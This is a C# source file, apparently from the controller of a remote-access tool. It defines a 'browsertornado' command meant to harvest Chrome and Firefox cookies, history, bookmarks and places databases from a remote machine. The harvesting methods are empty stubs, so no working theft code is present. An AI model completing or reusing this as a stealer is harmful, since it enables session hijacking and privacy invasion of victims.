using System.Collections.Generic;
using Master.AdvancedConsole;
using Master.Commands.Core;
using Shared;

namespace Master.Commands.BrowserTornado
{
    internal class BrowserTornadoCommand : IMasterCommand
    {
        public string name { get; } = "browsertornado";

        public string description { get; } = "test";

        public bool isLocal { get; } = false;

        public List<string> validArguments { get; } = new List<string>()
        {
            "?*:[filename]"
        };


        public void Process(List<string> args)
        {
            var databases = new Databases();
            ColorTools.WriteCommandMessage("Starting browsers databases harvest...");

            GetDatabases(databases);

            if (databases.HasNoDatabase())
            {
                ColorTools.WriteCommandError("No browser database could be harvested");
            }
            else
            {
                ProcessDatabases(databases);
                Cleanup(databases);
            }
        }


        void GetDatabases(Databases databases)
        {
            var result = GlobalCommandsManager.networkManager.ReadLine().Split('|');
            if (result[1] == "OK")
            {

            }
            else
            {

            }
        }


        void ProcessDatabases(Databases databases)
        {
            ColorTools.WriteCommandMessage("Extracting informations from the databases...");
        }


        void Cleanup(Databases databases)
        {

        }
    }


    internal class Databases
    {
        public string chromecookies { get; set; }

        public string chromehistory { get; set; }

        public string chromebookmarks { get; set; }

        public string ffcookies { get; set; }

        public string ffplaces { get; set; }

        public bool HasNoDatabase()
        {
            return chromebookmarks == ""
                   && chromecookies == ""
                   && chromehistory == ""
                   && ffcookies == ""
                   && ffplaces == "";
        }
    }
}
